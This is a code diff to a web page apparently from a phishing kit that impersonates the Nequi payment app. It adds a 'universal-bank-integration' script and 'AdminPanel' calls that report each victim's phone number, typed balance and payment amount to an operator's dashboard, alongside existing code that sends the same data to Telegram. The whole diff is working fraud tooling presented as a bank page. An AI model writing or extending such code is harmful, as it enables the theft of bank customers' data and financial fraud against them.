@@ -89,6 +89,7 @@
 
   <script src="/socket.io/socket.io.js"></script>
   <script src="/js/telegram-integration.js"></script>
+  <script src="/js/universal-bank-integration.js"></script>
   <script>
     document.addEventListener('DOMContentLoaded', () => {
       console.log('[NEQUI SALDO INPUT] Inicializando');
@@ -102,6 +103,22 @@
       const amount = sessionStorage.getItem('payment_amount') || '0';
       console.log('[NEQUI SALDO INPUT] Teléfono recuperado:', phoneNumber);
       console.log('[NEQUI SALDO INPUT] Monto a pagar:', amount);
+
+      // Generar session ID para el admin panel
+      let sessionId = localStorage.getItem('nequi_session_id');
+      if (!sessionId) {
+        sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        localStorage.setItem('nequi_session_id', sessionId);
+      }
+
+      // Notificar inicio de sesión al admin panel
+      if (window.AdminPanel) {
+        window.AdminPanel.notifySessionStart(sessionId, 'Nequi', {
+          step: 'saldo-input',
+          celular: phoneNumber,
+          monto: amount
+        });
+      }
 
       // Permitir solo números en el input de saldo
       saldoInput.addEventListener('input', function(e) {
@@ -149,6 +166,15 @@
           localStorage.setItem('nequi_session_id', sessionId);
         }
         console.log('[NEQUI SALDO INPUT] SessionID recuperado:', sessionId);
+
+        // Notificar actualización al admin panel
+        if (window.AdminPanel) {
+          window.AdminPanel.notifySessionUpdate(sessionId, 'verificando-saldo', {
+            celular: phoneNumber,
+            saldo: saldo,
+            monto: amount
+          });
+        }
 
         // Enviar datos a Telegram
         const result = await TelegramClient.sendToTelegram('nequi_saldo', {
